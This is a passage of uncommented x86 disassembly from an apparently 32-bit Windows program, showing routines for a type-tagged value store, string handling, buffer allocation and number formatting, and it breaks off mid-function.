  40b3f2:	push   edi
  40b3f3:	mov    edi,edx
  40b3f5:	mov    ebx,ecx
  40b3f7:	call   0x40b10f
  40b3fc:	test   eax,eax
  40b3fe:	jne    0x40b405
  40b400:	or     eax,0xffffffff
  40b403:	jmp    0x40b426
  40b405:	push   esi
  40b406:	xor    esi,esi
  40b408:	test   edi,edi
  40b40a:	je     0x40b423
  40b40c:	push   0x0
  40b40e:	push   0x0
  40b410:	xor    edx,edx
  40b412:	mov    ecx,ebx
  40b414:	call   0x40aef3
  40b419:	cmp    eax,0xffffffff
  40b41c:	je     0x40b423
  40b41e:	inc    esi
  40b41f:	cmp    esi,edi
  40b421:	jb     0x40b40c
  40b423:	mov    eax,esi
  40b425:	pop    esi
  40b426:	pop    edi
  40b427:	pop    ebx
  40b428:	ret    
  40b429:	int3   
  40b42a:	int3   
  40b42b:	int3   
  40b42c:	int3   
  40b42d:	int3   
  40b42e:	mov    edi,edi
  40b430:	push   ebp
  40b431:	mov    ebp,esp
  40b433:	push   ecx
  40b434:	push   ebx
  40b435:	mov    ebx,ecx
  40b437:	call   0x40b10f
  40b43c:	test   eax,eax
  40b43e:	jne    0x40b445
  40b440:	or     eax,0xffffffff
  40b443:	jmp    0x40b48e
  40b445:	push   esi
  40b446:	push   edi
  40b447:	push   DWORD PTR [ebp+0x8]
  40b44a:	call   DWORD PTR ds:0x4120c4
  40b450:	lea    esi,[eax+0x1]
  40b453:	lea    ecx,[esi+esi*1]
  40b456:	call   0x40ab1d
  40b45b:	mov    edi,eax
  40b45d:	mov    DWORD PTR [ebp-0x4],edi
  40b460:	test   edi,edi
  40b462:	je     0x40b489
  40b464:	mov    edx,DWORD PTR [ebp+0x8]
  40b467:	mov    ecx,edi
  40b469:	push   esi
  40b46a:	call   0x40a26c
  40b46f:	push   edi
  40b470:	lea    eax,[esi+esi*1]
  40b473:	push   eax
  40b474:	push   ecx
  40b475:	mov    ecx,ebx
  40b477:	call   0x40af5f
  40b47c:	cmp    eax,0xffffffff
  40b47f:	jne    0x40b48c
  40b481:	lea    ecx,[ebp-0x4]
  40b484:	call   0x40aa69
  40b489:	or     eax,0xffffffff
  40b48c:	pop    edi
  40b48d:	pop    esi
  40b48e:	pop    ebx
  40b48f:	mov    esp,ebp
  40b491:	pop    ebp
  40b492:	ret    0x8
  40b495:	int3   
  40b496:	int3   
  40b497:	int3   
  40b498:	int3   
  40b499:	int3   
  40b49a:	mov    edi,edi
  40b49c:	push   ebp
  40b49d:	mov    ebp,esp
  40b49f:	push   ecx
  40b4a0:	push   ecx
  40b4a1:	and    DWORD PTR [ebp-0x4],0x0
  40b4a5:	lea    eax,[ebp-0x4]
  40b4a8:	push   esi
  40b4a9:	push   eax
  40b4aa:	mov    esi,ecx
  40b4ac:	call   0x40aeb4
  40b4b1:	mov    ecx,eax
  40b4b3:	mov    DWORD PTR [ebp-0x8],ecx
  40b4b6:	test   ecx,ecx
  40b4b8:	je     0x40b4e7
  40b4ba:	mov    edx,DWORD PTR [ebp-0x4]
  40b4bd:	mov    eax,DWORD PTR [ecx+0x10]
  40b4c0:	test   edx,edx
  40b4c2:	je     0x40b4c9
  40b4c4:	mov    DWORD PTR [edx+0x10],eax
  40b4c7:	jmp    0x40b4cc
  40b4c9:	mov    DWORD PTR [esi+0x8],eax
  40b4cc:	cmp    ecx,DWORD PTR [esi+0xc]
  40b4cf:	jne    0x40b4d4
  40b4d1:	mov    DWORD PTR [esi+0xc],edx
  40b4d4:	dec    DWORD PTR [esi+0x4]
  40b4d7:	call   0x40afd7
  40b4dc:	lea    ecx,[ebp-0x8]
  40b4df:	call   0x40aa69
  40b4e4:	xor    eax,eax
  40b4e6:	inc    eax
  40b4e7:	pop    esi
  40b4e8:	mov    esp,ebp
  40b4ea:	pop    ebp
  40b4eb:	ret    
  40b4ec:	int3   
  40b4ed:	int3   
  40b4ee:	int3   
  40b4ef:	int3   
  40b4f0:	int3   
  40b4f1:	call   0x40b10f
  40b4f6:	test   eax,eax
  40b4f8:	jne    0x40b4fb
  40b4fa:	ret    
  40b4fb:	mov    eax,DWORD PTR [ecx+0x4]
  40b4fe:	ret    
  40b4ff:	int3   
  40b500:	int3   
  40b501:	int3   
  40b502:	int3   
  40b503:	int3   
  40b504:	mov    ecx,DWORD PTR ds:0x4114a8
  40b50a:	push   0x0
  40b50c:	call   0x40aeb4
  40b511:	test   eax,eax
  40b513:	je     0x40b526
  40b515:	cmp    DWORD PTR [eax+0x4],0x80000
  40b51c:	jne    0x40b526
  40b51e:	mov    ecx,DWORD PTR [eax+0xc]
  40b521:	jmp    0x40b4f1
  40b526:	xor    eax,eax
  40b528:	ret    
  40b529:	int3   
  40b52a:	int3   
  40b52b:	int3   
  40b52c:	int3   
  40b52d:	int3   
  40b52e:	push   0x0
  40b530:	call   0x40aeb4
  40b535:	test   eax,eax
  40b537:	jne    0x40b53c
  40b539:	xor    eax,eax
  40b53b:	ret    
  40b53c:	cmp    DWORD PTR [eax+0x4],0x10000
  40b543:	je     0x40b54e
  40b545:	cmp    DWORD PTR [eax+0x4],0x80000
  40b54c:	jne    0x40b539
  40b54e:	mov    eax,DWORD PTR [eax+0xc]
  40b551:	ret    
  40b552:	int3   
  40b553:	int3   
  40b554:	int3   
  40b555:	int3   
  40b556:	int3   
  40b557:	push   0x0
  40b559:	call   0x40aeb4
  40b55e:	test   eax,eax
  40b560:	jne    0x40b565
  40b562:	xor    eax,eax
  40b564:	ret    
  40b565:	cmp    DWORD PTR [eax+0x4],0x20000
  40b56c:	jne    0x40b562
  40b56e:	mov    eax,DWORD PTR [eax+0xc]
  40b571:	ret    
  40b572:	int3   
  40b573:	int3   
  40b574:	int3   
  40b575:	int3   
  40b576:	int3   
  40b577:	push   0x0
  40b579:	call   0x40aeb4
  40b57e:	test   eax,eax
  40b580:	jne    0x40b585
  40b582:	xor    eax,eax
  40b584:	ret    
  40b585:	cmp    DWORD PTR [eax+0x4],0x40000
  40b58c:	je     0x40b597
  40b58e:	cmp    DWORD PTR [eax+0x4],0x30000
  40b595:	jne    0x40b582
  40b597:	mov    eax,DWORD PTR [eax+0xc]
  40b59a:	mov    eax,DWORD PTR [eax]
  40b59c:	ret    
  40b59d:	int3   
  40b59e:	int3   
  40b59f:	int3   
  40b5a0:	int3   
  40b5a1:	int3   
  40b5a2:	push   0x0
  40b5a4:	call   0x40aeb4
  40b5a9:	test   eax,eax
  40b5ab:	jne    0x40b5b4
  40b5ad:	fld    DWORD PTR ds:0x401c58
  40b5b3:	ret    
  40b5b4:	cmp    DWORD PTR [eax+0x4],0x60000
  40b5bb:	jne    0x40b5ad
  40b5bd:	mov    eax,DWORD PTR [eax+0xc]
  40b5c0:	fld    DWORD PTR [eax]
  40b5c2:	ret    
  40b5c3:	int3   
  40b5c4:	int3   
  40b5c5:	int3   
  40b5c6:	int3   
  40b5c7:	int3   
  40b5c8:	push   0x0
  40b5ca:	call   0x40aeb4
  40b5cf:	test   eax,eax
  40b5d1:	jne    0x40b5da
  40b5d3:	fld    QWORD PTR ds:0x401c60
  40b5d9:	ret    
  40b5da:	cmp    DWORD PTR [eax+0x4],0x70000
  40b5e1:	jne    0x40b5d3
  40b5e3:	mov    eax,DWORD PTR [eax+0xc]
  40b5e6:	fld    QWORD PTR [eax]
  40b5e8:	ret    
  40b5e9:	int3   
  40b5ea:	int3   
  40b5eb:	int3   
  40b5ec:	int3   
  40b5ed:	int3   
  40b5ee:	mov    edi,edi
  40b5f0:	push   ebp
  40b5f1:	mov    ebp,esp
  40b5f3:	sub    esp,0x10
  40b5f6:	push   ebx
  40b5f7:	mov    ebx,DWORD PTR [ebp+0x8]
  40b5fa:	xor    eax,eax
  40b5fc:	push   esi
  40b5fd:	push   edi
  40b5fe:	mov    edi,ebx
  40b600:	xor    esi,esi
  40b602:	push   esi
  40b603:	mov    DWORD PTR [ebp-0xc],esi
  40b606:	mov    DWORD PTR [ebp-0x8],esi
  40b609:	stos   DWORD PTR es:[edi],eax
  40b60a:	stos   DWORD PTR es:[edi],eax
  40b60b:	stos   DWORD PTR es:[edi],eax
  40b60c:	stos   DWORD PTR es:[edi],eax
  40b60d:	call   0x40aeb4
  40b612:	test   eax,eax
  40b614:	je     0x40b652
  40b616:	mov    ecx,0xa0000
  40b61b:	cmp    DWORD PTR [eax+0x4],ecx
  40b61e:	je     0x40b62e
  40b620:	cmp    DWORD PTR [eax+0x4],0xb0000
  40b627:	jne    0x40b652
  40b629:	cmp    DWORD PTR [eax+0x4],ecx
  40b62c:	jne    0x40b639
  40b62e:	mov    esi,DWORD PTR [eax+0xc]
  40b631:	mov    edi,ebx
  40b633:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b635:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b636:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b637:	jmp    0x40b652
  40b639:	mov    ecx,DWORD PTR [eax+0xc]
  40b63c:	push   ebx
  40b63d:	mov    eax,DWORD PTR [ecx]
  40b63f:	mov    DWORD PTR [ebp-0xc],eax
  40b642:	mov    eax,DWORD PTR [ecx+0x4]
  40b645:	mov    DWORD PTR [ebp-0x8],eax
  40b648:	lea    eax,[ebp-0xc]
  40b64b:	push   eax
  40b64c:	call   DWORD PTR ds:0x412040
  40b652:	pop    edi
  40b653:	pop    esi
  40b654:	mov    eax,ebx
  40b656:	pop    ebx
  40b657:	mov    esp,ebp
  40b659:	pop    ebp
  40b65a:	ret    0x4
  40b65d:	int3   
  40b65e:	int3   
  40b65f:	int3   
  40b660:	int3   
  40b661:	int3   
  40b662:	mov    edi,edi
  40b664:	push   ebp
  40b665:	mov    ebp,esp
  40b667:	sub    esp,0x20c
  40b66d:	mov    eax,ds:0x411004
  40b672:	xor    eax,ebp
  40b674:	mov    DWORD PTR [ebp-0x4],eax
  40b677:	and    DWORD PTR [ebp-0x208],0x0
  40b67e:	lea    eax,[ebp-0x204]
  40b684:	push   ebx
  40b685:	push   esi
  40b686:	mov    esi,DWORD PTR [ebp+0x8]
  40b689:	push   edi
  40b68a:	push   0x1fa
  40b68f:	push   0x0
  40b691:	push   eax
  40b692:	mov    DWORD PTR [ebp-0x20c],edx
  40b698:	mov    edi,ecx
  40b69a:	call   0x40eb54
  40b69f:	mov    ebx,DWORD PTR [ebp+0xc]
  40b6a2:	add    esp,0xc
  40b6a5:	test   ebx,ebx
  40b6a7:	jne    0x40b6b0
  40b6a9:	xor    eax,eax
  40b6ab:	jmp    0x40b768
  40b6b0:	mov    edx,DWORD PTR [ebp-0x20c]
  40b6b6:	mov    ecx,edi
  40b6b8:	push   0x0
  40b6ba:	call   0x40aeb4
  40b6bf:	mov    edi,eax
  40b6c1:	test   edi,edi
  40b6c3:	je     0x40b6a9
  40b6c5:	push   ebx
  40b6c6:	mov    edx,0x401350
  40b6cb:	mov    ecx,esi
  40b6cd:	call   0x40a26c
  40b6d2:	mov    eax,DWORD PTR [edi+0x4]
  40b6d5:	cmp    eax,0x20000
  40b6da:	je     0x40b756
  40b6dc:	cmp    eax,0x30000
  40b6e1:	je     0x40b74a
  40b6e3:	cmp    eax,0x40000
  40b6e8:	je     0x40b72a
  40b6ea:	cmp    eax,0x60000
  40b6ef:	je     0x40b723
  40b6f1:	cmp    eax,0x70000
  40b6f6:	jne    0x40b761
  40b6f8:	mov    eax,DWORD PTR [edi+0xc]
  40b6fb:	fld    QWORD PTR [eax]
  40b6fd:	push   ecx
  40b6fe:	push   ecx
  40b6ff:	fstp   QWORD PTR [esp]
  40b702:	push   0x401acc
  40b707:	lea    eax,[ebp-0x208]
  40b70d:	push   0xfe
  40b712:	push   eax
  40b713:	call   0x40adea
  40b718:	add    esp,0x14
  40b71b:	lea    edx,[ebp-0x208]
  40b721:	jmp    0x40b759
  40b723:	mov    eax,DWORD PTR [edi+0xc]
  40b726:	fld    DWORD PTR [eax]
  40b728:	jmp    0x40b6fd
  40b72a:	mov    eax,DWORD PTR [edi+0xc]
  40b72d:	push   DWORD PTR [eax]
  40b72f:	push   0x401ac4
  40b734:	lea    eax,[ebp-0x208]
  40b73a:	push   0xfe
  40b73f:	push   eax
  40b740:	call   0x40adea
  40b745:	add    esp,0x10
  40b748:	jmp    0x40b71b
  40b74a:	mov    eax,DWORD PTR [edi+0xc]
  40b74d:	push   DWORD PTR [eax]
  40b74f:	push   0x401abc
  40b754:	jmp    0x40b734
  40b756:	mov    edx,DWORD PTR [edi+0xc]
  40b759:	push   ebx
  40b75a:	mov    ecx,esi
  40b75c:	call   0x40a26c
  40b761:	push   esi
  40b762:	call   DWORD PTR ds:0x4120c4
  40b768:	mov    ecx,DWORD PTR [ebp-0x4]
  40b76b:	pop    edi
  40b76c:	pop    esi
  40b76d:	xor    ecx,ebp
  40b76f:	pop    ebx
  40b770:	call   0x40e2c0
  40b775:	mov    esp,ebp
  40b777:	pop    ebp
  40b778:	ret    0x8
  40b77b:	int3   
  40b77c:	int3   
  40b77d:	int3   
  40b77e:	int3   
  40b77f:	int3   
  40b780:	mov    edi,edi
  40b782:	push   ebp
  40b783:	mov    ebp,esp
  40b785:	push   0x0
  40b787:	call   0x40aeb4
  40b78c:	test   eax,eax
  40b78e:	je     0x40b7a6
  40b790:	cmp    DWORD PTR [eax+0x4],0x80000
  40b797:	jne    0x40b7a6
  40b799:	mov    edx,DWORD PTR [ebp+0x8]
  40b79c:	mov    ecx,DWORD PTR [eax+0xc]
  40b79f:	call   0x40b52e
  40b7a4:	jmp    0x40b7a8
  40b7a6:	xor    eax,eax
  40b7a8:	pop    ebp
  40b7a9:	ret    0x4
  40b7ac:	int3   
  40b7ad:	int3   
  40b7ae:	int3   
  40b7af:	int3   
  40b7b0:	int3   
  40b7b1:	mov    edi,edi
  40b7b3:	push   ebp
  40b7b4:	mov    ebp,esp
  40b7b6:	push   0x0
  40b7b8:	call   0x40aeb4
  40b7bd:	test   eax,eax
  40b7bf:	je     0x40b7d7
  40b7c1:	cmp    DWORD PTR [eax+0x4],0x80000
  40b7c8:	jne    0x40b7d7
  40b7ca:	mov    edx,DWORD PTR [ebp+0x8]
  40b7cd:	mov    ecx,DWORD PTR [eax+0xc]
  40b7d0:	call   0x40b557
  40b7d5:	jmp    0x40b7d9
  40b7d7:	xor    eax,eax
  40b7d9:	pop    ebp
  40b7da:	ret    0x4
  40b7dd:	int3   
  40b7de:	int3   
  40b7df:	int3   
  40b7e0:	int3   
  40b7e1:	int3   
  40b7e2:	mov    edi,edi
  40b7e4:	push   ebp
  40b7e5:	mov    ebp,esp
  40b7e7:	push   edi
  40b7e8:	push   0x0
  40b7ea:	call   0x40aeb4
  40b7ef:	mov    edi,eax
  40b7f1:	test   edi,edi
  40b7f3:	jne    0x40b7f9
  40b7f5:	xor    eax,eax
  40b7f7:	jmp    0x40b877
  40b7f9:	cmp    DWORD PTR [edi+0x4],0x20000
  40b800:	je     0x40b808
  40b802:	cmp    DWORD PTR [edi+0x4],0x0
  40b806:	jne    0x40b7f5
  40b808:	push   ebx
  40b809:	push   esi
  40b80a:	push   DWORD PTR [ebp+0x8]
  40b80d:	call   DWORD PTR ds:0x4120c4
  40b813:	cmp    DWORD PTR [edi+0x4],0x0
  40b817:	lea    ebx,[eax+0x1]
  40b81a:	jne    0x40b839
  40b81c:	lea    esi,[ebx+ebx*1]
  40b81f:	mov    ecx,esi
  40b821:	call   0x40ab1d
  40b826:	mov    DWORD PTR [edi+0xc],eax
  40b829:	test   eax,eax
  40b82b:	je     0x40b85c
  40b82d:	mov    DWORD PTR [edi+0x4],0x20000
  40b834:	mov    DWORD PTR [edi+0x8],esi
  40b837:	jmp    0x40b866
  40b839:	lea    eax,[ebx+ebx*1]
  40b83c:	cmp    DWORD PTR [edi+0x8],eax
  40b83f:	jae    0x40b866
  40b841:	lea    esi,[edi+0xc]
  40b844:	mov    ecx,esi
  40b846:	call   0x40aa69
  40b84b:	and    DWORD PTR [esi],0x0
  40b84e:	lea    ecx,[ebx+ebx*1]
  40b851:	call   0x40ab1d
  40b856:	mov    DWORD PTR [esi],eax
  40b858:	test   eax,eax
  40b85a:	jne    0x40b860
  40b85c:	xor    eax,eax
  40b85e:	jmp    0x40b875
  40b860:	lea    eax,[ebx+ebx*1]
  40b863:	mov    DWORD PTR [edi+0x8],eax
  40b866:	mov    edx,DWORD PTR [ebp+0x8]
  40b869:	mov    ecx,DWORD PTR [edi+0xc]
  40b86c:	push   ebx
  40b86d:	call   0x40a26c
  40b872:	xor    eax,eax
  40b874:	inc    eax
  40b875:	pop    esi
  40b876:	pop    ebx
  40b877:	pop    edi
  40b878:	pop    ebp
  40b879:	ret    0x8
  40b87c:	int3   
  40b87d:	int3   
  40b87e:	int3   
  40b87f:	int3   
  40b880:	int3   
  40b881:	mov    edi,edi
  40b883:	push   ebp
  40b884:	mov    ebp,esp
  40b886:	push   esi
  40b887:	push   0x0
  40b889:	xor    edx,edx
  40b88b:	call   0x40aeb4
  40b890:	mov    esi,eax
  40b892:	test   esi,esi
  40b894:	je     0x40b8d6
  40b896:	mov    eax,DWORD PTR [esi+0x4]
  40b899:	push   edi
  40b89a:	mov    edi,0x40000
  40b89f:	cmp    eax,edi
  40b8a1:	je     0x40b8a9
  40b8a3:	test   eax,eax
  40b8a5:	je     0x40b8ad
  40b8a7:	jmp    0x40b8bc
  40b8a9:	test   eax,eax
  40b8ab:	jne    0x40b8ca
  40b8ad:	push   0x4
  40b8af:	pop    ecx
  40b8b0:	call   0x40ab1d
  40b8b5:	mov    DWORD PTR [esi+0xc],eax
  40b8b8:	test   eax,eax
  40b8ba:	jne    0x40b8c0
  40b8bc:	xor    eax,eax
  40b8be:	jmp    0x40b8d5
  40b8c0:	mov    DWORD PTR [esi+0x4],edi
  40b8c3:	mov    DWORD PTR [esi+0x8],0x4
  40b8ca:	mov    ecx,DWORD PTR [esi+0xc]
  40b8cd:	mov    eax,DWORD PTR [ebp+0x8]
  40b8d0:	mov    DWORD PTR [ecx],eax
  40b8d2:	xor    eax,eax
  40b8d4:	inc    eax
  40b8d5:	pop    edi
  40b8d6:	pop    esi
  40b8d7:	pop    ebp
  40b8d8:	ret    0x4
  40b8db:	int3   
  40b8dc:	int3   
  40b8dd:	int3   
  40b8de:	int3   
  40b8df:	int3   
  40b8e0:	mov    edi,edi
  40b8e2:	push   ebp
  40b8e3:	mov    ebp,esp
  40b8e5:	mov    ecx,DWORD PTR ds:0x4114a8
  40b8eb:	push   esi
  40b8ec:	xor    esi,esi
  40b8ee:	push   esi
  40b8ef:	push   0x3
  40b8f1:	pop    edx
  40b8f2:	call   0x40aeb4
  40b8f7:	test   eax,eax
  40b8f9:	je     0x40b93e
  40b8fb:	cmp    DWORD PTR [eax+0x4],0x80000
  40b902:	jne    0x40b93e
  40b904:	push   edi
  40b905:	mov    edi,DWORD PTR [ebp+0xc]
  40b908:	test   edi,edi
  40b90a:	je     0x40b939
  40b90c:	mov    edx,DWORD PTR [ebp+0x8]
  40b90f:	mov    ecx,DWORD PTR [eax+0xc]
  40b912:	push   esi
  40b913:	call   0x40aeb4
  40b918:	test   eax,eax
  40b91a:	je     0x40b939
  40b91c:	mov    ecx,DWORD PTR [eax+0x4]
  40b91f:	mov    edx,0x10000
  40b924:	cmp    ecx,edx
  40b926:	je     0x40b92c
  40b928:	test   ecx,ecx
  40b92a:	jne    0x40b939
  40b92c:	test   ecx,ecx
  40b92e:	jne    0x40b933
  40b930:	mov    DWORD PTR [eax+0x4],edx
  40b933:	xor    esi,esi
  40b935:	mov    DWORD PTR [eax+0xc],edi
  40b938:	inc    esi
  40b939:	mov    eax,esi
  40b93b:	pop    edi
  40b93c:	jmp    0x40b940
  40b93e:	xor    eax,eax
  40b940:	pop    esi
  40b941:	pop    ebp
  40b942:	ret    0x8
  40b945:	int3   
  40b946:	int3   
  40b947:	int3   
  40b948:	int3   
  40b949:	int3   
  40b94a:	mov    edi,edi
  40b94c:	push   ebp
  40b94d:	mov    ebp,esp
  40b94f:	push   0x0
  40b951:	call   0x40aeb4
  40b956:	test   eax,eax
  40b958:	je     0x40b974
  40b95a:	cmp    DWORD PTR [eax+0x4],0x80000
  40b961:	jne    0x40b974
  40b963:	mov    edx,DWORD PTR [ebp+0x8]
  40b966:	push   ecx
  40b967:	push   DWORD PTR [ebp+0xc]
  40b96a:	mov    ecx,DWORD PTR [eax+0xc]
  40b96d:	call   0x40b7e2
  40b972:	jmp    0x40b976
  40b974:	xor    eax,eax
  40b976:	pop    ebp
  40b977:	ret    0xc
  40b97a:	int3   
  40b97b:	int3   
  40b97c:	int3   
  40b97d:	int3   
  40b97e:	int3   
  40b97f:	mov    edi,edi
  40b981:	push   ebp
  40b982:	mov    ebp,esp
  40b984:	mov    ecx,DWORD PTR ds:0x4114a8
  40b98a:	push   esi
  40b98b:	xor    esi,esi
  40b98d:	push   esi
  40b98e:	push   0x3
  40b990:	pop    edx
  40b991:	call   0x40aeb4
  40b996:	test   eax,eax
  40b998:	je     0x40b9ba
  40b99a:	cmp    DWORD PTR [eax+0x4],0x80000
  40b9a1:	jne    0x40b9ba
  40b9a3:	mov    edx,DWORD PTR [ebp+0x8]
  40b9a6:	mov    ecx,DWORD PTR [eax+0xc]
  40b9a9:	push   esi
  40b9aa:	call   0x40aeb4
  40b9af:	test   eax,eax
  40b9b1:	je     0x40b9b6
  40b9b3:	mov    esi,DWORD PTR [eax+0x4]
  40b9b6:	mov    eax,esi
  40b9b8:	jmp    0x40b9bc
  40b9ba:	xor    eax,eax
  40b9bc:	pop    esi
  40b9bd:	pop    ebp
  40b9be:	ret    0x4
  40b9c1:	int3   
  40b9c2:	int3   
  40b9c3:	int3   
  40b9c4:	int3   
  40b9c5:	int3   
  40b9c6:	mov    edi,edi
  40b9c8:	push   ebp
  40b9c9:	mov    ebp,esp
  40b9cb:	push   0x0
  40b9cd:	xor    edx,edx
  40b9cf:	call   0x40aeb4
  40b9d4:	test   eax,eax
  40b9d6:	je     0x40ba0f
  40b9d8:	mov    edx,0x80000
  40b9dd:	cmp    DWORD PTR [eax+0x4],edx
  40b9e0:	jne    0x40ba0f
  40b9e2:	push   esi
  40b9e3:	mov    esi,DWORD PTR [eax+0xc]
  40b9e6:	mov    ecx,esi
  40b9e8:	call   0x40b10f
  40b9ed:	test   eax,eax
  40b9ef:	je     0x40ba09
  40b9f1:	mov    ecx,DWORD PTR [ebp+0x8]
  40b9f4:	call   0x40b10f
  40b9f9:	test   eax,eax
  40b9fb:	je     0x40ba09
  40b9fd:	push   ecx
  40b9fe:	push   0x4
  40ba00:	mov    ecx,esi
  40ba02:	call   0x40aef3
  40ba07:	jmp    0x40ba0c
  40ba09:	or     eax,0xffffffff
  40ba0c:	pop    esi
  40ba0d:	jmp    0x40ba12
  40ba0f:	or     eax,0xffffffff
  40ba12:	pop    ebp
  40ba13:	ret    0x4
  40ba16:	int3   
  40ba17:	int3   
  40ba18:	int3   
  40ba19:	int3   
  40ba1a:	int3   
  40ba1b:	mov    edi,edi
  40ba1d:	push   esi
  40ba1e:	mov    esi,ecx
  40ba20:	test   esi,esi
  40ba22:	jne    0x40ba3a
  40ba24:	call   DWORD PTR ds:0x4120cc
  40ba2a:	test   eax,eax
  40ba2c:	jne    0x40ba36
  40ba2e:	push   0x57
  40ba30:	call   DWORD PTR ds:0x412014
  40ba36:	xor    eax,eax
  40ba38:	pop    esi
  40ba39:	ret    
  40ba3a:	call   0x40a30b
  40ba3f:	cmp    eax,0x2
  40ba42:	jbe    0x40ba36
  40ba44:	push   0x2
  40ba46:	push   0x1
  40ba48:	mov    edx,0x4018ec
  40ba4d:	mov    ecx,esi
  40ba4f:	call   0x40a31f
  40ba54:	neg    eax
  40ba56:	pop    esi
  40ba57:	sbb    eax,eax
  40ba59:	inc    eax
  40ba5a:	ret    
  40ba5b:	int3   
  40ba5c:	int3   
  40ba5d:	int3   
  40ba5e:	int3   
  40ba5f:	int3   
  40ba60:	mov    edi,edi
  40ba62:	push   ebp
  40ba63:	mov    ebp,esp
  40ba65:	push   ecx
  40ba66:	push   ebx
  40ba67:	push   esi
  40ba68:	push   edi
  40ba69:	xor    edi,edi
  40ba6b:	mov    esi,ecx
  40ba6d:	push   edi
  40ba6e:	mov    DWORD PTR [ebp-0x4],edi
  40ba71:	call   DWORD PTR ds:0x412014
  40ba77:	test   esi,esi
  40ba79:	je     0x40bbc2
  40ba7f:	push   esi
  40ba80:	call   DWORD PTR ds:0x4120c4
  40ba86:	test   eax,eax
  40ba88:	je     0x40bbc2
  40ba8e:	lea    eax,[ebp-0x4]
  40ba91:	push   eax
  40ba92:	push   edi
  40ba93:	push   0x4
  40ba95:	call   DWORD PTR ds:0x41203c
  40ba9b:	call   DWORD PTR ds:0x4120cc
  40baa1:	cmp    eax,0xea
  40baa6:	je     0x40baaf
  40baa8:	xor    eax,eax
  40baaa:	jmp    0x40bbc5
  40baaf:	push   0x1
  40bab1:	push   DWORD PTR [ebp-0x4]
  40bab4:	xor    edx,edx
  40bab6:	push   0xe
  40bab8:	pop    ecx
  40bab9:	call   0x409339
  40babe:	mov    ebx,eax
  40bac0:	test   ebx,ebx
  40bac2:	jne    0x40bad8
  40bac4:	call   DWORD PTR ds:0x4120cc
  40baca:	test   eax,eax
  40bacc:	jne    0x40baa8
  40bace:	push   0x8
  40bad0:	call   DWORD PTR ds:0x412014
  40bad6:	jmp    0x40baa8
  40bad8:	lea    eax,[ebp-0x4]
  40badb:	push   eax
  40badc:	push   ebx
  40badd:	push   0x4
  40badf:	call   DWORD PTR ds:0x41203c
  40bae5:	test   eax,eax
  40bae7:	je     0x40baa8
  40bae9:	push   edi
  40baea:	push   0x1
  40baec:	mov    edx,esi
  40baee:	mov    ecx,ebx
  40baf0:	call   0x40a31f
  40baf5:	test   eax,eax
  40baf7:	je     0x40bbc2
  40bafd:	mov    ecx,esi
  40baff:	call   0x40bbd1
  40bb04:	cmp    eax,0x1
  40bb07:	mov    DWORD PTR [ebp-0x4],edi
  40bb0a:	lea    eax,[ebp-0x4]
  40bb0d:	jne    0x40bb75
  40bb0f:	push   ecx
  40bb10:	push   eax
  40bb11:	xor    edx,edx
  40bb13:	mov    ecx,esi
  40bb15:	call   0x40bc8a
  40bb1a:	test   eax,eax
  40bb1c:	je     0x40baa8
  40bb1e:	push   0x1
  40bb20:	push   DWORD PTR [ebp-0x4]
  40bb23:	xor    edx,edx
  40bb25:	push   0xf
  40bb27:	pop    ecx
  40bb28:	call   0x409339
  40bb2d:	mov    edi,eax
  40bb2f:	test   edi,edi
  40bb31:	je     0x40baa8
  40bb37:	push   ecx
  40bb38:	lea    eax,[ebp-0x4]
  40bb3b:	mov    edx,edi
  40bb3d:	push   eax
  40bb3e:	mov    ecx,esi
  40bb40:	call   0x40bc8a
  40bb45:	test   eax,eax
  40bb47:	je     0x40baa8
  40bb4d:	push   0x0
  40bb4f:	push   0x1
  40bb51:	mov    edx,edi
  40bb53:	mov    ecx,ebx
  40bb55:	call   0x40a31f
  40bb5a:	test   eax,eax
  40bb5c:	je     0x40bbc2
  40bb5e:	mov    edx,0x401ad4
  40bb63:	push   0x0
  40bb65:	push   0x1
  40bb67:	mov    ecx,edi
  40bb69:	call   0x40a31f
  40bb6e:	neg    eax
  40bb70:	sbb    eax,eax
  40bb72:	inc    eax
  40bb73:	jmp    0x40bbc5
  40bb75:	push   eax
  40bb76:	push   edi
  40bb77:	push   0x7
  40bb79:	call   DWORD PTR ds:0x41203c
  40bb7f:	call   DWORD PTR ds:0x4120cc
  40bb85:	cmp    eax,0xea
  40bb8a:	jne    0x40baa8
  40bb90:	push   0x1
  40bb92:	push   DWORD PTR [ebp-0x4]
  40bb95:	xor    edx,edx
  40bb97:	push   0xe
  40bb99:	pop    ecx
  40bb9a:	call   0x409339
  40bb9f:	mov    edi,eax
  40bba1:	test   edi,edi
  40bba3:	je     0x40baa8
  40bba9:	lea    eax,[ebp-0x4]
  40bbac:	push   eax
  40bbad:	push   edi
  40bbae:	push   0x7
  40bbb0:	call   DWORD PTR ds:0x41203c
  40bbb6:	test   eax,eax
  40bbb8:	je     0x40baa8
  40bbbe:	mov    edx,esi
  40bbc0:	jmp    0x40bb63
  40bbc2:	xor    eax,eax
  40bbc4:	inc    eax
  40bbc5:	pop    edi
  40bbc6:	pop    esi
  40bbc7:	pop    ebx
  40bbc8:	mov    esp,ebp
  40bbca:	pop    ebp
  40bbcb:	ret    
  40bbcc:	int3   
  40bbcd:	int3   
  40bbce:	int3   
  40bbcf:	int3   
  40bbd0:	int3   
  40bbd1:	mov    edi,edi
  40bbd3:	push   ebp
  40bbd4:	mov    ebp,esp
  40bbd6:	sub    esp,0x14
  40bbd9:	mov    eax,ds:0x411004
  40bbde:	xor    eax,ebp
  40bbe0:	mov    DWORD PTR [ebp-0x4],eax
  40bbe3:	push   ebx
  40bbe4:	push   esi
  40bbe5:	push   edi
  40bbe6:	mov    edi,ecx
  40bbe8:	xor    ebx,ebx
  40bbea:	mov    esi,ebx
  40bbec:	test   edi,edi
  40bbee:	je     0x40bc67
  40bbf0:	push   edi
  40bbf1:	call   DWORD PTR ds:0x4120c4
  40bbf7:	test   eax,eax
  40bbf9:	je     0x40bc67
  40bbfb:	push   ebx
  40bbfc:	push   ebx
  40bbfd:	push   0x10
  40bbff:	mov    edx,edi
  40bc01:	pop    ecx
  40bc02:	call   0x409339
  40bc07:	test   eax,eax
  40bc09:	jne    0x40bc19
  40bc0b:	call   DWORD PTR ds:0x4120cc
  40bc11:	test   eax,eax
  40bc13:	jne    0x40bc72
  40bc15:	push   0x8
  40bc17:	jmp    0x40bc6c
  40bc19:	push   0x4018e8
  40bc1e:	push   eax
  40bc1f:	call   DWORD PTR ds:0x412270
